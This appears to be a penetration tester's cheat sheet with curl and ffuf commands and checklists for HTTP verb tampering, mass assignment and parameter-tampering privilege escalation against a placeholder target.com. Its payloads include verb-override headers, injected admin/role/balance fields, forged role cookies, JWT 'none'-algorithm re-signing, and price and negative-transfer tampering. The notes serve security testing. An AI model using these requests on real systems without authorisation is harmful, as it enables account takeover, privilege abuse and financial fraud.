## Table of Contents:

- [ ] [[#HTTP Verb Tampering]]
- [ ] [[#Web Mass Assignment]]
- [ ] [[#Privilege Escalation via Parameter Tampering]]

---

## HTTP Verb Tampering

`ACCESS Denied` on a functionality, try verb tampering.

| Verb      | Description                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------- |
| `HEAD`    | Identical to a GET request, but its response only contains the `headers`, without the response body |
| `PUT`     | Writes the request payload to the specified location                                                |
| `DELETE`  | Deletes the resource at the specified location                                                      |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs                          |
| `PATCH`   | Apply partial modifications to the resource at the specified location                               |

```bash
curl -X GET https://target.com/admin
curl -X INVENTED https://target.com/admin
# Manual verb testing with curl
# Arbitrary verbs sometimes bypass with INVENTED

curl -X OPTIONS https://target.com/api/users -i
# Check allowerd methods

curl -I https://target.com/api/users  
# Look for Allow: header

curl -X POST https://target.com/admin \
  -H "X-HTTP-Method-Override: DELETE"

curl -X POST https://target.com/admin \
  -H "_method: PATCH"
# Override verb via headers (bypass WAF/middleware)

ffuf -u https://target.com/api/admin \
  -w /usr/share/seclists/Fuzzing/http-request-methods.txt \
  -X FUZZ -mc 200,201,301,302
# ffuf verb fuzzing
```


- [ ] Try all standard verbs on any 401/403 endpoint
- [ ] Try verb override headers: `X-HTTP-Method-Override`, `X-Method-Override`, `_method`
- [ ] Test arbitrary/invented verbs as some frameworks allow anything
- [ ] Test verb tampering on API endpoints specifically REST APIs are most vulnerable
- [ ] Try HEAD instead of GET, it sometimes returns body with no auth check
- [ ] In the `File Manager` web application, if we get error on creating a new file with special characters, try to change the request method to see if it works.

---

## Web Mass Assignment

App accepts `JSON/form data` then test if you can set fields not exposed in UI.

```bash
# Identify the object structure first
# Register a user and note what fields are returned in response
curl -s https://target.com/api/users/1 -H "Authorization: Bearer token" | jq

# Try adding extra fields to registration/update request
# Original request:
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'

# Mass assignment attempt: add role/admin fields
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin"}'

curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","isAdmin":true,"verified":true}'

# Profile update: try adding privileged fields
curl -X PUT https://target.com/api/users/me \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token" \
  -d '{"email":"new@email.com","role":"admin","balance":99999}'

# Common fields to try
# role, isAdmin, admin, verified, confirmed, active,
# balance, credits, plan, subscription, group,
# permissions, scope, accessLevel, userType
```

- [ ] Register a user and note all returned fields in response
- [ ] Intercept registration/update request in Burp and add extra fields
- [ ] Try role elevation fields: `role`, `isAdmin`, `admin`, `userType`
- [ ] Try account state fields: `verified`, `confirmed`, `active`, `approved`
- [ ] Try financial fields: `balance`, `credits`, `plan`, `subscription`
- [ ] Test both JSON body and form-encoded body
- [ ] Check if nested objects are vulnerable: `{"user":{"role":"admin"}}`
- [ ] Try on every endpoint that creates or updates an object

---

## Privilege Escalation via Parameter Tampering

```bash
# Intercept hidden form field tampering in Burp and modify

# JWT role claim tampering
# Decode JWT, modify role claim, re-sign with none alg
python3 jwt_tool.py <token> -T  # tamper mode

# Cookie-based role
# Original cookie: role=user
curl https://target.com/dashboard \
  -H "Cookie: session=abc123; role=admin"

# Header-based tenant switching
curl https://target.com/api/users \
  -H "Authorization: Bearer token" \
  -H "X-Tenant-ID: 2" \
  -H "X-Org-ID: admin"

# Parameter pollution for role bypass
curl "https://target.com/api/users?role=user&role=admin"

# Query string role
curl "https://target.com/dashboard?user=test&role=admin"

# Numeric privilege level
# Try: privilege=0,1,2,99,100
curl "https://target.com/api/data?user_id=5&privilege=99"

# Price/value tampering (business logic)
curl -X POST https://target.com/api/checkout \
  -d '{"item_id":1,"quantity":1,"price":0.01}'

# Negative values
curl -X POST https://target.com/api/transfer \
  -d '{"amount":-100,"to_account":"attacker"}'
```

- [ ] Check all hidden form fields in page source
- [ ] Check cookies for role/privilege values
- [ ] Check query string for user-controlled privilege params
- [ ] Test negative values on numeric fields
- [ ] Test zero and extreme values: 0, -1, 99999
- [ ] Test coupon/voucher stacking
- [ ] Read JS source as frontend validation often reveals all accepted values for privilege parameters

---